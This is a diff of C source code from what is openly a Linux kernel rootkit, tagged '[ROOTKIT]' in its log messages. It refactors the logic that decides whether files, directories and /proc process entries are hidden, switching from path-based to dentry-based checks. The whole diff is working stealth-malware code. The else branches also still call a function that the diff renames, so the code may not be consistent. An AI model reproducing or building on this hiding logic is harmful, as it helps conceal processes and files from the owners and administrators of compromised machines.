@@ -16,13 +16,13 @@
 #include <linux/string.h>
 #include <linux/types.h>
 
-bool is_process_path(const path_t *const p_path, const char **const ps_name, pid_t *p_pid)
+bool is_process_dentry(const dentry_t *const p_dentry, const char **const ps_name, pid_t *p_pid)
 {
     int i_res                = 0;    // Result of `kstrtoint()` (0 on success)
     const dentry_t *p_parent = NULL; // Parent dentry structure
     pid_t i32_pid            = -1;   // PID of the process found in the path, if any
 
-    IF_U (!is_path_proc_descendant(p_path)) {
+    IF_U (!is_dentry_proc_descendant(p_dentry)) {
         if (ps_name != NULL) {
             *ps_name = NULL;
         }
@@ -32,7 +32,7 @@ bool is_process_path(const path_t *const p_path, const char **const ps_name, pid
         return false;
     }
 
-    p_parent = p_path->dentry;
+    p_parent = p_dentry;
 
     // Go up the directory tree until we reach a direct child of the root
     while (!IS_ROOT(p_parent->d_parent)) {
@@ -55,15 +55,16 @@ bool is_process_path(const path_t *const p_path, const char **const ps_name, pid
     return i_res == 0;
 }
 
-bool is_path_hidden(const path_t *const p_path)
+bool is_dentry_hidden(const dentry_t *const p_dentry)
 {
-    pid_t i32_found_pid = -1; // PID of the process found in the path, if any
+    bool b_ret          = false; // Return value
+    pid_t i32_found_pid = -1;    // PID of the process found in the path, if any
 
-    IF_U (p_path == NULL) {
+    IF_U (p_dentry == NULL) {
         return false;
     }
 
-    IF_U (is_process_path(p_path, NULL, &i32_found_pid)) {
+    IF_U (is_process_dentry(p_dentry, NULL, &i32_found_pid)) {
         pr_info("[ROOTKIT] * This is a process file/dir (PID: %d)\n", i32_found_pid);
 
         // If the path is a process file/dir, check if the process is hidden
@@ -73,13 +74,14 @@ bool is_path_hidden(const path_t *const p_path)
         pr_info("[ROOTKIT] * This is not a process file/dir\n");
     }
 
-    IF_U (is_filename_or_pid_hidden(p_path->dentry->d_name.name,
-                                    is_path_parent_proc_root(p_path))) {
+    IF_U (is_filename_or_pid_hidden(p_dentry->d_name.name, is_dentry_parent_proc_root(p_dentry))) {
         return true;
     }
 
     // If the path is not a process file/dir, check if one of its parents has a hidden name
-    return is_path_hierarchy_hidden(p_path);
+    b_ret = is_dentry_hierarchy_hidden(p_dentry);
+
+    return b_ret;
 }
 
 bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
@@ -111,12 +113,13 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
 
     IF_U (b_lookup_parents) {
         // If we are looking for a parent directory, we need to go up the directory tree
-        path_get(&path); // Increment the path reference count while we use it
-        path.dentry = dget_parent(path.dentry);
-        path_put(&path); // Release the path structure
+        dget(path.dentry->d_parent); // Increment the parent dentry reference count
+        b_ret = is_dentry_hidden(path.dentry->d_parent);
+        dput(path.dentry->d_parent); // Decrement the parent dentry reference count
     }
-
-    b_ret = is_path_hidden(&path);
+    else {
+        b_ret = is_path_hidden(&path);
+    }
 
     // Free the path structure
     path_put(&path);
@@ -138,12 +141,13 @@ bool is_pathname_hidden(const int i32_dfd, const char __user *const s_pathname,
     }
 
     IF_U (b_lookup_parents) {
-        path_get(&path);
-        path.dentry = dget_parent(path.dentry);
-        path_put(&path);
+        dget(path.dentry->d_parent);
+        b_ret = is_dentry_hidden(path.dentry->d_parent);
+        dput(path.dentry->d_parent);
     }
-
-    b_ret = is_path_hidden(&path);
+    else {
+        b_ret = is_path_hidden(&path);
+    }
 
     path_put(&path);
 
